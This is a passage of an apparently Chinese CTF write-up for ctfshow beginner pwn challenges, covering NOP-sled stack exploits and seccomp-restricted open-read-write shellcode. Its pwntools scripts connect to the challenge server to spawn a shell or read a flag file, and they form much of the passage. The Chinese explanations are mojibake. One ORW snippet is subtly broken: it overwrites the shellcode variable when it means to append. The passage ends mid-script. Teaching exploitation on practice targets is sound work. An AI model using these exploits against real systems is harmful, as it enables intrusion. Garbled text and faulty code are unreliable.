</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">1336</span> <span class="o">+</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;The current location: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shell_addr</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="mh">0x2d</span> <span class="o">+</span> <span class="mi">668</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">shell_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨è¿™é‡Œç‰¹åˆ«è§£é‡Šä¸€ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shell_addr</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="mh">0x2d</span> <span class="o">+</span> <span class="mi">668</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>addr</code>ï¼š<code>query_position()</code> è¿”å›çš„æ ˆåœ°å€å‚è€ƒï¼ˆ<code>v1</code> çš„åœ°å€ï¼‰ï¼›</p>
<p><code>+0x2d</code>ï¼šè¡¥å¿æ ˆå¸§åç§»ï¼ˆ è®¡ç®—å¾—å‡ºï¼š<code>0x15 + 4 + 4 + 0x10 = 0x2d</code>ï¼‰ï¼Œå°† â€œ<code>v1</code> çš„å‚è€ƒåœ°å€â€ ä¿®æ­£ä¸º â€œå®é™… payload ç¼“å†²åŒºï¼ˆ<code>seed</code> æ•°ç»„ï¼‰çš„èµ·å§‹åœ°å€â€ï¼›</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>è¾ƒä½åœ°å€</th>
          <th>â‡’</th>
          <th>â‡’</th>
          <th>â‡’</th>
          <th>æ›´é«˜åœ°å€</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>stk[ebp-0x15]</td>
          <td>ebpâ‡’&lt;æ—§ebp&gt;[4]</td>
          <td>&lt;è¿”å›åœ°å€&gt;[4]</td>
          <td>padding[0x10]</td>
          <td>buffer[0x1000]</td>
      </tr>
  </tbody>
</table></div>
<p>21 (0x15) + 4 + 4 + 16 (0x10) = 45 å­—èŠ‚ ï¼ˆ0x2dï¼‰</p>
<p><code>+668</code>ï¼šè¦†ç›–ç¨‹åºçš„æœ€å¤§è´Ÿåç§»ï¼ˆ<code>-668</code>ï¼‰ï¼Œç¡®ä¿è·³è½¬åœ°å€è½å…¥ 1336 ä¸ª nop çš„èŒƒå›´å†…ï¼ˆæ— è®ºéšæœºåç§»å¦‚ä½•æ³¢åŠ¨ï¼Œåœ°å€éƒ½èƒ½å‘½ä¸­ nop åºåˆ—ï¼‰ã€‚</p>
<blockquote>
<p><code>0x10ï¼ˆpaddingï¼‰</code> æ˜¯<strong>ç¼–è¯‘å™¨æ’å…¥çš„æ ˆå¯¹é½å¡«å……å­—èŠ‚</strong>ï¼Œæ— å®é™…ä¸šåŠ¡æ„ä¹‰ï¼Œä»…ä¸ºäº†æ»¡è¶³ CPU å†…å­˜è®¿é—®çš„å¯¹é½è§„åˆ™ï¼›åœ¨ <code>0x2d</code> çš„è®¡ç®—ä¸­ï¼Œå®ƒæ˜¯ã€Œv1 åˆ° seed [0]ã€å›ºå®šåç§»çš„ä¸€éƒ¨åˆ†ï¼Œå¿…é¡»åŠ è¿›å»æ‰èƒ½è®©åœ°å€æ ¡å‡†åˆ°æ­£ç¡®çš„ payload æ³¨å…¥ç‚¹ã€‚</p>
</blockquote>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/242.png"
	width="941"
	height="700"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/242_hu_207a95fa89730080.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/242_hu_d488948d8264c5bd.png 1024w"
	loading="lazy"
	
		alt="è½¬è½½åšä¸»å¤§ä½¬çš„æ ˆå›¾"
	
	
		class="gallery-image" 
		data-flex-grow="134"
		data-flex-basis="322px"
	
></p>
<p>çœ‹å›*query_positionå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241.png"
	width="610"
	height="253"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_b76db1763bd6df64.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/241_hu_5afb8f9679a37742.png 1024w"
	loading="lazy"
	
		alt="query_positionå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="241"
		data-flex-basis="578px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°v1åœ¨query_positionå‡½æ•°ebp-0x15çš„ä½ç½®ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/243.png"
	width="750"
	height="673"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/243_hu_cef9a77328443fe3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/243_hu_bd2c3eb35aa71df0.png 1024w"
	loading="lazy"
	
		alt="æ ˆå¸ƒå±€"
	
	
		class="gallery-image" 
		data-flex-grow="111"
		data-flex-basis="267px"
	
></p>
<p>åœ¨è¿™é‡Œæˆ‘æƒ³è¯´çš„æ˜¯<strong>nop sled å¹¶éä¸“é—¨ç”¨äºçªç ´ ASLR ä¿æŠ¤</strong>ï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯ â€œæ‰©å¤§ shellcode çš„å¯å‘½ä¸­åœ°å€èŒƒå›´â€ï¼Œå¯ç”¨äºåº”å¯¹å¤šç§å¯¼è‡´ â€œshellcode åœ°å€ä¸ç¡®å®šâ€ çš„åœºæ™¯ï¼ŒASLR ä¿æŠ¤åªæ˜¯å…¶ä¸­ä¸€ç§ã€‚</p>
<blockquote>
<p>ASLRï¼ˆåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼‰çš„æ ¸å¿ƒæ˜¯è®©ç¨‹åºçš„æ ˆã€å †ã€åº“ç­‰å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€æ¯æ¬¡è¿è¡Œæ—¶éšæœºå˜åŒ–ï¼ˆ PWN_061ã€PWN_062 ç­‰é¢˜ç›®å¼€å¯ PIEï¼Œæœ¬è´¨æ˜¯ ASLR çš„å»¶ä¼¸ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•æå‰ç¡®å®š shellcode çš„ç²¾ç¡®åœ°å€ã€‚</p>
<p>nop sled çš„ä½œç”¨æ˜¯ï¼šé€šè¿‡åœ¨ shellcode å‰å¡«å……å¤§é‡<code>\x90</code>ï¼ˆnop æŒ‡ä»¤ï¼‰ï¼Œå½¢æˆä¸€ä¸ª â€œæŒ‡ä»¤åºåˆ—åŒºåŸŸâ€â€”â€” åªè¦ç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°è¯¥åŒºåŸŸçš„<strong>ä»»æ„ä½ç½®</strong>ï¼Œéƒ½ä¼šé¡ºç€ nop æŒ‡ä»¤é¡ºåºæ‰§è¡Œï¼Œæœ€ç»ˆå‘½ä¸­åç»­çš„ shellcodeã€‚</p>
<p>ä»è¿™ä¸ªè§’åº¦çœ‹ï¼Œnop sled<strong>å¯ä»¥ç”¨äºçªç ´ ASLR å¸¦æ¥çš„åœ°å€éšæœºæ€§</strong>ï¼Œä½†è¿™å¹¶éå…¶å”¯ä¸€ç”¨é€”ã€‚</p>
</blockquote>
<h3 id="pnw_068">PNW_068
</h3><p>é¢˜ç›®ï¼š64bit nop sledã€‚</p>
<p>è¿™æ˜¯64ä½ç¨‹åºï¼Œä¿æŠ¤æœºåˆ¶å’Œä¸Šä¸€é¢˜ä¸€æ ·ã€‚</p>
<p>å”¯ä¸€ä¸åŒçš„å°±æ˜¯è¿™ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/445.png"
	width="650"
	height="176"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/445_hu_c8538ae870241e2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/445_hu_a40846f6d6ffe021.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="886px"
	
></p>
<p>æŠŠä¸Šä¸€é¢˜çš„0x2dæ¢æˆ0x35å°±å¥½ï¼ˆ0x15+8+8+16(æ ˆå¯¹é½)=0x35ï¼‰</p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28134</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">1336</span> <span class="o">+</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;The current location: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">+</span> <span class="mi">668</span> <span class="o">+</span> <span class="mh">0x35</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_069">PWN_069
</h3><p>é¢˜ç›®ï¼šå¯ä»¥å°è¯•ç”¨ORWè¯»flag flagæ–‡ä»¶ä½ç½®ä¸º/ctfshow_flagã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/244.png"
	width="895"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/244_hu_5888906a57a3adf4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/244_hu_3919f1e7c20ea38e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="389"
		data-flex-basis="933px"
	
></p>
<p>64ä½ä»…éƒ¨åˆ†å¼€å¯RELROï¼Œå…¶ä»–ä¿æŠ¤å…¨å…³ã€‚</p>
<p>IDAæŸ¥çœ‹mainå‡½æ•°ï¼ˆä¾æ®å‡½æ•°åŠŸèƒ½ä¿®æ”¹å¯¹åº”å‡½æ•°åï¼‰ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/245.png"
	width="690"
	height="170"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/245_hu_4bd20d6e8b245f4d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/245_hu_ad8d371ac9bf937.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="405"
		data-flex-basis="974px"
	
></p>
<blockquote>
<p>å¤ä¹ ä¸‹mmapå‡½æ•°ä½œç”¨ï¼Œä¸»è¦ç”¨é€”æœ‰ä¸‰ä¸ªï¼š</p>
<p>1ã€å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œé€šå¸¸åœ¨éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œé¢‘ç¹è¯»å†™æ—¶ä½¿ç”¨ï¼Œè¿™æ ·ç”¨å†…å­˜è¯»å†™å–ä»£I/Oè¯»å†™ï¼Œä»¥è·å¾—è¾ƒé«˜çš„æ€§èƒ½ï¼›</p>
<p>2ã€å°†ç‰¹æ®Šæ–‡ä»¶è¿›è¡ŒåŒ¿åå†…å­˜æ˜ å°„ï¼Œå¯ä»¥ä¸ºå…³è”è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼›</p>
<p>3ã€ä¸ºæ— å…³è”çš„è¿›ç¨‹æä¾›å…±äº«å†…å­˜ç©ºé—´ï¼Œä¸€èˆ¬ä¹Ÿæ˜¯å°†ä¸€ä¸ªæ™®é€šæ–‡ä»¶æ˜ å°„åˆ°å†…å­˜ä¸­ã€‚</p>
</blockquote>
<p>æŠŠä»0x123000å¼€å§‹çš„åœ°å€ï¼Œå¤§å°ä¸º0x1000çš„é•¿åº¦ï¼Œæƒé™æ”¹ä¸º<code>å¯å†™å¯æ‰§è¡Œ</code>ã€‚</p>
<p>è·Ÿè¿›seccompå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/246.png"
	width="705"
	height="235"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/246_hu_80ee2fadc85a00d3.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/246_hu_d7d4eb3f947974a7.png 1024w"
	loading="lazy"
	
		alt="seccomp"
	
	
		class="gallery-image" 
		data-flex-grow="300"
		data-flex-basis="720px"
	
></p>
<p>seccompä¸»è¦ç”¨äºé…ç½®å’ŒåŠ è½½ <strong>Seccompï¼ˆSecure Computing Modeï¼Œå®‰å…¨è®¡ç®—æ¨¡å¼ï¼‰</strong> ç­–ç•¥ï¼Œæ¥é™åˆ¶ç¨‹åºå¯ä»¥æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»¥å¢å¼ºç¨‹åºçš„å®‰å…¨æ€§ã€‚</p>
<p>wowè¿™é‡Œæ–°å¤§é™†&hellip;.æ²™ç›’è¿‡æ»¤ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">seccomp-tools dump ./pwn
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/247.png"
	width="984"
	height="438"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/247_hu_7b0db2f85b62029c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/247_hu_1b6df6a4536fab9f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="224"
		data-flex-basis="539px"
	
></p>
<p>åªæœ‰readï¼Œwriteï¼Œopenï¼Œexitå¯ä»¥ä½¿ç”¨ï¼Œä½¿ç”¨ open&ndash;&gt;read&ndash;&gt;write è¿™æ ·çš„orwçš„æ–¹å¼ã€‚</p>
<blockquote>
<p>ORWæŒ‡çš„æ˜¯Open-Read-WriteæŠ€æœ¯ï¼Œæ˜¯ä¸€ç§åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨è¯»å–æ–‡ä»¶å†…å®¹ï¼ˆå¦‚flagæ–‡ä»¶ï¼‰çš„æ”»å‡»æ–¹æ³•ã€‚</p>
<p>ORWé€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨å®ç°ï¼š</p>
<p>openï¼šæ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œè·å–æ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p>readï¼šé€šè¿‡æ–‡ä»¶æè¿°ç¬¦è¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¼“å†²åŒºã€‚</p>
<p>writeï¼šå°†ç¼“å†²åŒºçš„å†…å®¹å†™å…¥æ ‡å‡†è¾“å‡ºã€‚</p>
</blockquote>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/248.png"
	width="660"
	height="175"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/248_hu_18988f2cbd8a93ca.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/248_hu_4d3b52149e6e7a93.png 1024w"
	loading="lazy"
	
		alt="ctfshowå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="377"
		data-flex-basis="905px"
	
></p>
<p>è¿™é‡Œæœ‰æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ï¼Œåœ¨ä¸Šé¢æˆ‘æåŠè¿‡mmapå‡½æ•°ï¼Œåœ¨mainå‡½æ•°å·²ç»æ‰§è¡Œè¿‡ä¸€æ¬¡äº†ï¼Œåœ¨0x123000è¿™é‡Œå·²ç»æœ‰å¯å†™å¯æ‰§è¡Œæƒé™äº†ã€‚åˆ°è¿™é‡Œï¼Œæ”»å‡»æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬æƒ³åŠæ³•å¾€mmapç»™çš„è¿™ä¸ªåœ°å€æ®µé‡Œé¢å†™shellcode(ORW)ï¼Œç„¶åè·³è½¬åˆ°è¿™é‡Œæ‰§è¡Œï¼Œå°±OKäº†ã€‚</p>
<p>é‚£æˆ‘ä»¬çš„orw_shellcodeï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">mmap</span> <span class="o">=</span> <span class="mh">0x123000</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/ctfshow_flag&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">mmap</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span><span class="c1">## readé‡Œçš„fdå†™3æ˜¯å› ä¸ºç¨‹åºæ‰§è¡Œçš„æ—¶å€™æ–‡ä»¶æè¿°ç¬¦æ˜¯ä»3å¼€å§‹çš„ï¼Œwriteé‡Œçš„1æ˜¯æ ‡å‡†è¾“å‡ºåˆ°æ˜¾ç¤ºå™¨</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">mmap</span><span class="p">,</span><span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">orw_shellcode</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>shellcodeå·²ç»ç¼–å¥½äº†ï¼Œç°åœ¨ç¼–payloadè®©ç¨‹åºå¬æˆ‘ä»¬è¯ï¼Œå°†shellcodeæ³¨å…¥è¿›å†…å­˜ä¸­å»ã€‚</p>
<p>shellcraft.readçš„ä½œç”¨æ˜¯æ‰§è¡Œreadå‡½æ•°çš„åç»­æµç¨‹â€”â€”è¯»å–0x100é•¿åº¦çš„å­—ç¬¦ï¼ˆä¹Ÿå°±æ˜¯åç»­çš„orw_shellcodeï¼‰ï¼Œæ–‡ä»¶æè¿°ç¬¦fd=3ï¼ˆ0ã€1ã€2å·²è¢«æ ‡å‡†æ–‡ä»¶å ç”¨ï¼‰</p>
<p><code>shellcraft.write(1, mmap, 0x100)</code> çš„ <code>1</code> æ˜¯ <strong>Linux æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰çš„å›ºå®šæ–‡ä»¶æè¿°ç¬¦</strong>ï¼Œå…¶åŠŸèƒ½æ˜¯å°† <code>mmap</code> åŒºåŸŸä¸­å­˜å‚¨çš„ <code>\ctfshow_flag</code> å†…å®¹è¾“å‡ºåˆ°å±å¹•ï¼Œå½“æˆprintfä¹Ÿè¡Œã€‚</p>
<p>payloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x400a01</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">))</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rax, 0x123000; jmp rax&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;sub rsp, 0x30; jmp rsp&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘åœ¨æ±‡ç¼–ä»£ç åˆ†æçš„è¿‡ç¨‹ä¸­æ‰¾åˆ°å…³é”®çš„jmp_rspåé—¨åœ°å€ï¼Œå¯ä»¥è°ƒç”¨è¿™è¡Œæ±‡ç¼–ä»£ç æ¥å®ç°è·³è½¬å›èµ·å§‹åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/249.png"
	width="786"
	height="154"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/249_hu_bc25242458eb6cd9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/249_hu_2ab8c0e2c163ef75.png 1024w"
	loading="lazy"
	
		alt="åé—¨jmp_rsp = 0x400a01"
	
	
		class="gallery-image" 
		data-flex-grow="510"
		data-flex-basis="1224px"
	
></p>
<p>payload = asm(shellcraft.read(0, mmap, 0x100)) çš„æ„æ€æ˜¯å¯åŠ¨readå‡½æ•°ï¼Œå¼€å¯â€œè¯»å–æ¨¡å¼â€å¤„äºå¾…è¯»å–çŠ¶æ€ï¼Œç­‰å¾…åé¢çš„orw_shellcodeçš„å‡ºç°ï¼Œå¹¶å­˜åˆ°mmapçš„å¯è¯»å¯å†™åŒºåŸŸï¼ˆ2+4ï¼‰ï¼›</p>
<blockquote>
<p>æœ€æ­£ç¡®ç†è§£ï¼šæ‰§è¡Œåå› ç¼ºå°‘è¾“å…¥æ•°æ®ï¼ˆorw_shellcodeï¼‰æ‰è¿›å…¥ â€œç­‰å¾…çŠ¶æ€â€ã€‚</p>
</blockquote>
<p>asm(&ldquo;mov rax, 0x123000; jmp rax&rdquo;)çš„æ„æ€æ˜¯è·³åˆ°mmap=0x123000åŒºåŸŸï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘è¿™ä¸ªåŒºåŸŸï¼Œç­‰å¾…åç»­orw_shellcodeæ³¨å…¥æ‰§è¡Œã€‚</p>
<p>payload = asm(shellcraft.read(0, mmap, 0x100)) + asm(&ldquo;mov rax, 0x123000; jmp rax&rdquo;)åŠ èµ·æ¥ä¸è¶³0x28ä¸ªå­—èŠ‚ï¼ˆ0x20+8ï¼‰ï¼Œè®©bufåˆšå¥½å……æ»¡ï¼Œä»¥ä¾¿åç»­<strong>å°† <code>rsp</code> è°ƒæ•´åˆ° <code>buf</code> ç¼“å†²åŒºèµ·å§‹åœ°å€</strong>ï¼ˆbufå¤åŸï¼‰ã€‚</p>
<p>python3çš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span> <span class="p">,</span> <span class="mi">28194</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mmap</span> <span class="o">=</span> <span class="mh">0x123000</span>
</span></span><span class="line"><span class="cl"><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x400a01</span>
</span></span><span class="line"><span class="cl">
